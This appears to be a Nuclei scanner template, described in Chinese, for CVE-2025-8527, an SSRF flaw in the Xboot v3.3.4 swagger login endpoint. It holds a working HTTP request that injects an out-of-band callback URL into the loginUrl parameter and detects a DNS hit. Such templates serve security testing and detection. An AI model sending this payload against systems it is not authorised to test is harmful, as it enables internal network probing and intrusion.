id: xboot-miniapp-platform-ssrf
info:
  name: "Xboot小程序管理平台 login接口 SSRF漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    Xboot (v3.3.4) 的 /xboot/common/swagger/login 接口在处理用户提交的 URI 参数时，未实施充分的输入验证机制，导致允许攻击者构造恶意请求发起内部网络探测。该缺陷可被利用发起 SSRF 攻击，获取目标内网服务信息或实施进一步渗透。
  reference:
  - CVE-2025-8527
  tags: Xboot
http:
- raw:
  - |
    GET /xboot/common/swagger/login?loginUrl=https://{{interactsh-url}}&username=x&password=x HTTP/1.1
    Host: {{Hostname}}
    Connection: close
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: interactsh_protocol
    words:
    - "dns"
